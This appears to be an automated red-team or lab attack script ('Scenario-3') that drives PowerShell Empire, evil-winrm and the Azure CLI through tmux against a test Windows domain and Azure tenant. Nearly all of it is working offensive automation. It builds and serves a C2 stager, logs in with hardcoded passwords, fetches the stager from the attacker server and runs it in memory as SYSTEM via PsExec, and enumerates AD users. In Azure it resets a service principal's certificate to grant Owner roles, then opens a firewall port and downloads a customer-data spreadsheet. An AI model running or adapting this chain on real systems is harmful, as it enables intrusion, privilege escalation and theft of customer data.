#!/bin/bash

SESSION_NAME="Scenario-3"
LOG_BASE="/home/kaliadmin/logs"


mkdir /home/kaliadmin/payloads
mkdir $LOG_BASE
# cp /home/kaliadmin/Import-ActiveDirectory.ps1 /home/kaliadmin/payloads/
# cp /home/kaliadmin/Microsoft.ActiveDirectory.Management.dll /home/kaliadmin/payloads/
cp /home/kaliadmin/webserver.py /home/kaliadmin/payloads/



LOG_FILE0="$LOG_BASE/$SESSION_NAME-0.log"
LOG_FILE1="$LOG_BASE/$SESSION_NAME-1.log"
LOG_FILE2="$LOG_BASE/$SESSION_NAME-2.log"
LOG_FILE3="$LOG_BASE/$SESSION_NAME-3.log"
LOG_FILE4="$LOG_BASE/$SESSION_NAME-4.log"

tmux kill-session -t $SESSION_NAME
sleep 3
tmux new-session -d -s $SESSION_NAME

echo "" >  $LOG_FILE0
echo "" >  $LOG_FILE1
echo "" >  $LOG_FILE2
echo "" >  $LOG_FILE3
echo "" >  $LOG_FILE4

tmux pipe-pane -t $SESSION_NAME:0 'cat >> '"$LOG_FILE0"
tmux send-keys -t $SESSION_NAME:0 "sudo powershell-empire server" 
sleep 2
tmux send-keys -t $SESSION_NAME:0 C-m
/home/kaliadmin/wait_for_prompt.exp "http://0.0.0.0:1337" $SESSION_NAME:0

sleep 7

tmux new-window -t $SESSION_NAME -n "Empire Client"
tmux pipe-pane -t $SESSION_NAME:1 'cat >> '"$LOG_FILE1"

tmux send-keys -t $SESSION_NAME:1 "sudo powershell-empire client" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "uselistener http" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Host http://server_ip_1:80" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Port 80" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "execute" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "usestager windows_csharp_exe" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Listener http" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set OutFile /home/kaliadmin/payloads/Scenario3.exe" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "execute" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7
cp /var/lib/powershell-empire/empire/client/generated-stagers/Scenario3.exe /home/kaliadmin/payloads/Scenario3.exe



tmux new-window -t $SESSION_NAME -n "Hosting Payload Web Server"
tmux pipe-pane -t $SESSION_NAME:2 'cat >> '"$LOG_FILE2"
tmux send-keys -t $SESSION_NAME:2 "cd /home/kaliadmin/payloads" 
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3


# tmux send-keys -t $SESSION_NAME:2 "python3 -m venv myenv" 
# sleep 2
# tmux send-keys -t $SESSION_NAME:2 C-m

# sleep 3

# tmux send-keys -t $SESSION_NAME:2 "source myenv/bin/activate" 
# sleep 2
# tmux send-keys -t $SESSION_NAME:2 C-m

# sleep 3

# tmux send-keys -t $SESSION_NAME:2 "pip install Flask" 
# sleep 2
# tmux send-keys -t $SESSION_NAME:2 C-m

# sleep 3


# tmux send-keys -t $SESSION_NAME:2 "python3 webserver.py" 
tmux send-keys -t $SESSION_NAME:2 "python3 -m http.server 8081" 
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3

read -p "Do you want to continue? (Y/N): " answer
if [[ "$answer" != "Y" && "$answer" != "y" ]]; then
    echo "Exiting script."
    exit 1
fi


tmux new-window -t $SESSION_NAME -n "Evil-Winrm - Sarfaraz Ahamed"
tmux pipe-pane -t $SESSION_NAME:3 'cat >> '"$LOG_FILE3"
# tmux send-keys -t $SESSION_NAME:3 "cat /home/kaliadmin/payloads/credentials.txt" 
# sleep 2
# tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "kaliadmin" $SESSION_NAME:3

# sleep 3

tmux send-keys -t $SESSION_NAME:3 "evil-winrm -i 192.168.1.3 -u 'csrp\JeffMcJunkin' -p 'SecureP@ssw0rd!'" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "whoami" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "hostname" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Set-Content -Path .\run.ps1 -Value "[System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri http://server_ip:8081/Scenario3.exe -UseBasicParsing).Content).EntryPoint.Invoke([DBNull]::Value, @())" -Encoding UTF8' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\JeffMcJunkin\Documents\PSTools.zip"' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Expand-Archive -Path "C:\Users\JeffMcJunkin\Documents\PSTools.zip" -DestinationPath "C:\Users\JeffMcJunkin\Documents"' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 '.\PsExec.exe -s powershell.exe -ExecutionPolicy Bypass -File "C:\Users\JeffMcJunkin\Documents\run.ps1" -accepteula' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux select-window -t $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "agents" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "checked in" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "interact " 
sleep 2
tmux send-keys -t $SESSION_NAME:1 Down 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "shell" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "whoami" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} | Select-Object TaskName, State" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "(Get-ScheduledTask -TaskName "StartAndCloseCmdEvery10Minutes").Actions | Select-Object Execute, Arguments | Format-List" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7


# tmux send-keys -t $SESSION_NAME:1 'Invoke-WebRequest -Uri "http://server_ip:8081/Import-ActiveDirectory.ps1" -OutFile "C:\Users\JeffMcJunkin\Documents\Import-ActiveDirectory.ps1"' 
# sleep 2
# tmux send-keys -t $SESSION_NAME:1 
# sleep 2
# tmux send-keys -t $SESSION_NAME:1 C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 'Invoke-WebRequest -Uri "http://server_ip:8081/Microsoft.ActiveDirectory.Management.dll" -OutFile "C:\Users\JeffMcJunkin\Documents\Microsoft.ActiveDirectory.Management.dll"' C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

# sleep 7

tmux send-keys -t $SESSION_NAME:1 'exit' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 'usemodule powershell_situational_awareness_network_powerview_get_user' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_situational_awareness_network_powerview_get_user) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 'set Properties samaccountname,description' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_situational_awareness_network_powerview_get_user) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 'execute' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux select-window -t $SESSION_NAME:3

tmux send-keys -t $SESSION_NAME:3 C-c

sleep 7

tmux send-keys -t $SESSION_NAME:3 "y" C-m
/home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "evil-winrm -i 192.168.1.3 -u 'csrp\SarfarazAhamedAdmin' -p 'UserPassword@123'" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Error: Exiting with code 1" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "evil-winrm -i 192.168.1.3 -u 'csrp\Administrator' -p 'P@ssw0rd@123!'" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "whoami" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "hostname" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Set-Content -Path .\run.ps1 -Value "[System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri http://server_ip:8081/Scenario3.exe -UseBasicParsing).Content).EntryPoint.Invoke([DBNull]::Value, @())" -Encoding UTF8' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\Administrator\Documents\PSTools.zip"' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Expand-Archive -Path "C:\Users\Administrator\Documents\PSTools.zip" -DestinationPath "C:\Users\Administrator\Documents"' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 '.\PsExec.exe -s powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Administrator\Documents\run.ps1" -accepteula' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux select-window -t $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "agents" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

sleep 7

agent=$(cat $LOG_FILE1 | grep "checked in" | tail -1 | awk '{print $15}')
echo $agent

sleep 7

tmux send-keys -t $SESSION_NAME:1 "interact $agent" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

# tmux send-keys -t $SESSION_NAME:3 "evil-winrm -i 192.168.1.3 -u 'csrp\JeffMcJunkin' -p 'SecureP@ssw0rd!'" C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

# sleep 7
#  DISM /Online /Add-Capability /CapabilityName:Rsat.ActiveDirectory.DS-LDS.Tools
# tmux send-keys -t $SESSION_NAME:3 'Import-Module .\Microsoft.ActiveDirectory.Management.dll' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

# sleep 7

# tmux send-keys -t $SESSION_NAME:3 'Import-Module .\Import-ActiveDirectory.ps1' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

# sleep 7

# tmux send-keys -t $SESSION_NAME:3 'Get-ADObject -Filter * -Properties ntSecurityDescriptor | ForEach-Object { $acl = (Get-Acl -Path ("AD:" + $_.DistinguishedName)).Access; $matchingAcl = $acl | Where-Object { $_.IdentityReference -eq "CSRP\JeffMcJunkin" }; if ($matchingAcl) { Write-Output "Object: $($_.DistinguishedName)"; $matchingAcl | ForEach-Object { Write-Output "Permission: $_" }; Write-Output "`n" } }' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

# sleep 7

# tmux send-keys -t $SESSION_NAME:3 'Set-ADAccountPassword -Identity "CoreyHam" -NewPassword (ConvertTo-SecureString "N3wP@ssw0rd1!" -AsPlainText -Force) -Reset' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

# sleep 7

# tmux select-window -t $SESSION_NAME:1

# tmux send-keys -t $SESSION_NAME:1 "usemodule powershell_lateral_movement_invoke_psexec" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_psexec) >" $SESSION_NAME:1

# sleep 7


# tmux send-keys -t $SESSION_NAME:1 "set ComputerName CSRP-DC" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_psexec) >" $SESSION_NAME:1

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "set Username CoreyHam" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_psexec) >" $SESSION_NAME:1

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "set Password N3wP@ssw0rd1!" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_psexec) >" $SESSION_NAME:1

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "set Listener http" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_psexec) >" $SESSION_NAME:1

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "execute" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_psexec) >" $SESSION_NAME:1

# sleep 7

# agent=$(cat $LOG_FILE1 | grep "checked in" | tail -1 | awk '{print $15}')
# echo $agent

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "agents" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "interact $agent" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1














tmux new-window -t $SESSION_NAME -n "Azure - Jeff McJunkin"
tmux pipe-pane -t $SESSION_NAME:4 'cat >> '"$LOG_FILE4"
tmux send-keys -t $SESSION_NAME:4 'cd /home/kaliadmin; mkdir Scenario-3; cd Scenario-3' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m

tmux send-keys -t $SESSION_NAME:4 'sudo docker run -it mcr.microsoft.com/azure-cli:cbl-mariner2.0' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az login -u JeffMcJunkin@sarfarazahamed2018gmail.onmicrosoft.com -p SecureP@ssw0rd!' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --output table' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'SERVICE_PRINCIPAL_ID=$(az ad sp list --display-name "myServicePrincipalName1" --query "[0].appId" --output tsv)' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'jeffUserId=$(az ad user show --id "JeffMcJunkin@sarfarazahamed2018gmail.onmicrosoft.com" --query 'id' --output tsv)' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'CERT_PATH=$(az ad app credential reset --id $SERVICE_PRINCIPAL_ID --create-cert --query "fileWithCertAndPrivateKey" -o tsv)' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'TENANT_ID=$(az account show --query tenantId --output tsv)' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4



sleep 30

tmux send-keys -t $SESSION_NAME:4 'az login --service-principal --username $SERVICE_PRINCIPAL_ID --certificate $CERT_PATH --tenant $TENANT_ID' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'SUBSCRIPTION_ID=$(az account show --query id --output tsv)' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment create --assignee $jeffUserId --role Owner  --scope /subscriptions/$SUBSCRIPTION_ID/resourceGroups/HR-Department' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment create --assignee $jeffUserId --role Owner  --scope /subscriptions/$SUBSCRIPTION_ID/resourceGroups/myRG1' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment create --assignee $jeffUserId --role Owner  --scope /subscriptions/$SUBSCRIPTION_ID/resourceGroups/WebApp' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment create --assignee $jeffUserId --role Owner  --scope /subscriptions/$SUBSCRIPTION_ID/resourceGroups/entraid' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment create --assignee $jeffUserId --role Owner  --scope /subscriptions/$SUBSCRIPTION_ID/resourceGroups/IT-KeyVault-Dev-RG' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az login -u JeffMcJunkin@sarfarazahamed2018gmail.onmicrosoft.com -p SecureP@ssw0rd!' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7


tmux send-keys -t $SESSION_NAME:4 'az resource list --resource-group WebApp --output table' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'vmResourceId=$(az vm show --resource-group "WebApp" --name "UbuntuVM" --query "id" --output tsv)' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment create --assignee $jeffUserId --role "Contributor" --scope $vmResourceId' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'publicIPAddress=$(az vm list-ip-addresses -g WebApp -n UbuntuVM --query "[].virtualMachine.network.publicIpAddresses[0].ipAddress" -o tsv)'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az network nsg rule create --resource-group "WebApp" --nsg-name UbuntuVMNSG --name "allow-8080" --priority 4001 --access Allow --direction Inbound --protocol Tcp --source-address-prefix "*" --source-port-range "*" --destination-address-prefix "*" --destination-port-range 8080'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 "az vm run-command invoke --resource-group "WebApp" --name UbuntuVM --command-id RunShellScript --scripts 'ls -la /home/azureuser'" # && tmux wait-for -S command_run"
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# tmux wait-for command_run
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 "az vm run-command invoke --resource-group WebApp --name UbuntuVM --command-id RunShellScript --scripts 'python3 -m http.server 8080 --directory /home/azureuser &'" # && tmux wait-for -S command_run"
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# tmux wait-for command_run
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 20

tmux send-keys -t $SESSION_NAME:4 'wget http://$publicIPAddress:8080/Customer_Accounts_Details.xlsx -O /home/kaliadmin/Scenario-3/Customer_Accounts_Details.xlsx' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az network nsg rule delete --resource-group "WebApp" --nsg-name UbuntuVMNSG --name "allow-8080"'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7




echo "Reached the end."




